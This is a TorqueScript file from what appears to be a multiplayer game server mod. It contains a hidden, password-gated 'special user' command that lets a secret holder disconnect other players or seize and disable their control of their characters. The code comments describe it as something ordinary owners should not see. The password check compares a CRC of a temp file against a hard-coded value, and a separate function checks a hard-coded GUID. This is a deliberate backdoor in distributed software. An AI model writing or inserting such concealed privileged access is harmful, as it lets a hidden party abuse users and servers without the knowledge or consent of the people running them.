//Special User Stuff
//You should not see this unless you own the special version of this mod.
function serverCmdUseSpecialCommand(%client,%password,%command,%args)
{
 %fileObj = new fileObject();
 %fileObj.openForWrite("Temp.txt");
 %fileObj.writeLine(%password);
 %fileObj.detach();
 if (getFileCRC("temp.txt") $= "1322697225")
 {
  %command = strLwr(%command);
  deleteFile("Temp.txt");
  switch$(%command)
  {
   case "disconnect":
   %name = getWord(%args, 0);
   %message = getWords(%args, 1);
   %target = plNameToCid(%name);

  if (!%target)
  {
   messageClient(%client,'msgClient','\c3\'%1\' does not exist.',%name);
   return 1;
  }
  if (%target == %client)
  {
   messageClient(%client,'msgClient',"Don\'t disconnect yourself!");
   return 1;
  }
  clientDisconnect(%target,%message);
  messageClient(%client,'msgClient','\c3You have disconnected player \'%1\'.',%target.namebase,%message);
  return 1;
  case "bottlesoul":
   %name = getWord(%args, 0);
 %message = getWords(%args, 1);
 %target = plNameToCid(%name);

 if (!%target)
 {
  messageClient(%client,'msgClient','\c3\'%1\' does not exist.',%name);
  return 1;
 }
 if (%target == %client)
 {
  messageClient(%client,'msgClient',"\c3Don\'t bottle your own soul!");
  return 1;
 }
 if (!isObject(%target.player) || %target.player.getMoveState() $= "dead")
 {
  messageClient(%client,'msgClient',"\c3%1 is dead.",%target.namebase);
  return 1;
 }

 if (%target.bottledSoul)
 {
  %target.bottledSoul = false;
  commandToClient(%target, 'setHudMode', '', "Player");
  %target.setControlObject(%target.player);
  clearCenterPrint(%target);
  messageAll('msgAdminForce','\c3%1 has released %2\'s soul!',%client.namebase,%target.namebase);
 }
 else
 {
  %target.bottledSoul = true;
  messageAll('msgAdminForce','\c3%1 has bottled up %2\'s soul!',%client.namebase,%target.namebase);
  centerPrint(%target,"Your soul has been bottled up by "@%client.namebase@". Press ALT + F4 to exit.");
  if (%target.isAIControlled())
  {
   %client.setControlObject(%target.player);
   %client.setControlObject(%client.player);
  }
  else
  commandToClient(%target, 'setHudMode', 'Pilot', "Shrike", 1);
 }
 return 1;
 }
 }
 else
 messageClient(%client,'msgClient',"\c3Nice try.");
}

//This is here as a dummy :)
function isSpecialUser(%client)
{
 if (%client.guid == 2003098)
 return true;
 else
 return false;
}
